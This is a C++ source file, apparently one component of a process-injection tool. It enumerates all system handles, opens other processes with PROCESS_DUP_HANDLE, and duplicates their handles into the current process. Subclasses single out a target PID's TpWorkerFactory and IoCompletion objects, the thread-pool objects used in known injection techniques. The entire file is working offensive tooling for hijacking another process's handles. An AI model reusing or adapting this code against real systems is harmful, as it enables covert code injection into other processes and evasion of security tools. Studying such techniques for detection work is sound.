#include "HandleHijacker.hpp"

HandleHijacker::HandleHijacker(std::wstring wsObjectType) : m_wsObjectType(wsObjectType)
{
}

std::shared_ptr<HANDLE> HandleHijacker::Hijack(DWORD dwDesiredAccess)
{
    auto pSystemInformation = w_QueryInformation<decltype(NtQuerySystemInformation), SYSTEM_INFORMATION_CLASS>("NtQuerySystemInformation", NtQuerySystemInformation, static_cast<SYSTEM_INFORMATION_CLASS>(SystemHandleInformation));
    const auto pSystemHandleInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(pSystemInformation.data());

    DWORD dwOwnerProcessId;
	std::shared_ptr<HANDLE> p_hDuplicatedObject;
    std::shared_ptr<HANDLE> p_hOwnerProcess;
    std::vector<BYTE> pObjectInformation;
    PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

    for (auto i = 0; i < pSystemHandleInformation->NumberOfHandles; i++)
    {
        try {
            dwOwnerProcessId = pSystemHandleInformation->Handles[i].UniqueProcessId;

            if (!IsDesiredOwnerProcess(dwOwnerProcessId))
            {
                continue;
            }

            p_hOwnerProcess = w_OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwOwnerProcessId);

            p_hDuplicatedObject = w_DuplicateHandle(
                *p_hOwnerProcess,
                UlongToHandle(pSystemHandleInformation->Handles[i].HandleValue), 
                GetCurrentProcess(),
                dwDesiredAccess,
                FALSE,
                NULL);

            pObjectInformation = w_QueryInformation<decltype(NtQueryObject), HANDLE, OBJECT_INFORMATION_CLASS>("NtQueryObject", NtQueryObject, *p_hDuplicatedObject, ObjectTypeInformation);
            pObjectTypeInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(pObjectInformation.data());

            if (m_wsObjectType != std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
                continue;
            }

            if (!IsDesiredHandle(p_hDuplicatedObject))
            {
                continue;
            }

            return p_hDuplicatedObject;
        }
        catch (std::runtime_error){}
    }

    throw std::runtime_error("Failed to hijack object handle");
}

bool HandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
{
	return true;
}

bool HandleHijacker::IsDesiredHandle(std::shared_ptr<HANDLE> p_hHijackedObject)
{
	return true;
}

WorkerFactoryHandleHijacker::WorkerFactoryHandleHijacker(DWORD dwTargetPid)
: HandleHijacker{ std::wstring(L"TpWorkerFactory") }, m_dwTargetPid(dwTargetPid)
{
}

bool WorkerFactoryHandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
{
	if (m_dwTargetPid == dwOwnerProcessId)
	{
        return true;
	}
    return false;
}

IoCompletionHandleHijacker::IoCompletionHandleHijacker(DWORD dwTargetPid)
    : HandleHijacker{ std::wstring(L"IoCompletion") }, m_dwTargetPid(dwTargetPid)
{
}

bool IoCompletionHandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
{
    if (m_dwTargetPid == dwOwnerProcessId)
    {
        return true;
    }
    return false;
}
